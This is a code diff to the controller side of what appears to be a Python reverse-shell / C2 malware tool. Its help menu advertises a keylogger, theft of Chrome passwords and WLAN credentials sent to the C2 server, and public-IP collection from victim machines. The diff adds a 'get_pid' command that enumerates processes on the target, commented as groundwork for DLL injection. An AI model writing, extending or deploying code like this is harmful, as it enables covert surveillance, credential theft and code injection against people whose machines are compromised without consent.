@@ -11,6 +11,8 @@ import json                    # The process of encoding JSON is usually called 
 
 import pyfiglet                # python library to print ASCII art fonts
 
+import re                      # python regex module
+
 # Getting wan/public ip:
 def getting_wanip():
 
@@ -83,6 +85,42 @@ def download_file(file_name):
 
 	trgt.settimeout(None)
 	file.close()
+
+# For knowing pid and running process name on trgt machine
+def all_process_exists(info_list):
+
+	c = 1
+	print(colored("\n[+] Process Exists...\n", "green"))
+	for elem in info_list:
+
+		PID = elem['pid']
+		P_Name = elem['name']
+
+		print("+"*32)
+		print(colored(f"Process{c}:\n", "cyan"))
+		print(colored(f"pid:{PID}\nprocessName:{P_Name}\n", "cyan"))
+		c += 1
+	print("+"*32)
+
+
+# For knowing inactive processes on trgt
+def some_process_doesnt_exists(info_list, prf_list):
+
+	# Converting list to string so that re module can be used
+	info_string = str(info_list)
+
+	# Extracting out all the names of the exe file which are running using regex
+	pid_list = re.findall('[A-Za-z]+.exe',info_string)
+
+	# converting to lowercase so that, it can be compared to the user given list
+	pid_list = [ i.lower() for i in pid_list ]
+
+	# Extracting out the processes which are not running
+	left_elem = list(set(prf_list) - set(pid_list))
+	left_elem = ', '.join(left_elem)
+	print(colored(f"\n[-] No process named {left_elem} is/are running!", 'red'))
+
+
 
 # Banner
 def banner():
@@ -202,14 +240,15 @@ keylog_dump                   :    To print keystrokes
 
 keylog_off                    :    To close keylogger and self destruct the logged file
 
-spoof_passwd                  :    To spoof password as a file from trgt machine's browser (windows 10, Chrome browser Version 89.0.4389.90 (Official Build) (64-bit)) and sents to C2Server
-(windows only)
+spoof_passwd                  :    To spoof password as a file from trgt machine's (Windows only)	              browser (windows 10, Chrome browser Version 89.0                                   .4389.90 (Official Build) (64-bit)) and sents to                                    C2 Server.
 
-spoof_wlan_creds              :    Spoofs wlan wifi profile creds and public/wan ip of the trgt windows machine
-(Windows only)
+spoof_wlan_creds              :    Spoofs wlan wifi profile creds and public/wan ip(Windows only)                     of the trgt windows machine
 
 spoof_wanip                   :    Spoofs public/wan ip of the trgt machine
 (Windows only)
+
+get_pid			      :    To know the processes running on the trgt 
+(Windows only)			   [You can update the list present in the rev_shell.py]
 
 ''', 'green'))
 			print(colored('You can also use other commands related to networking, etc for linux as well as windows','yellow'))
@@ -381,6 +420,26 @@ spoof_wanip                   :    Spoofs public/wan ip of the trgt machine
 			trgt.settimeout(None)
 			file.close()
 			counter += 1
+
+		# Getting running process id on win10 to perform dll injection  ✓
+		elif cmd[:7] == "get_pid" and len(cmd) > 1:
+
+			os_name = recv_eff()
+
+			if os_name == 'nt':
+
+				info_list = recv_eff()
+				prf_list = recv_eff()
+
+				if len(info_list) == len(prf_list):
+					all_process_exists(info_list)
+
+				elif len(info_list) < len(prf_list):
+					some_process_doesnt_exists(info_list, prf_list)
+					all_process_exists(info_list)
+
+			elif os_name == 'posix':
+				print(colored("\n[-] This OS is not Windows, command not applicable!\n ", "red"))
 
 
 		# list files in host's pwd directory  ✓
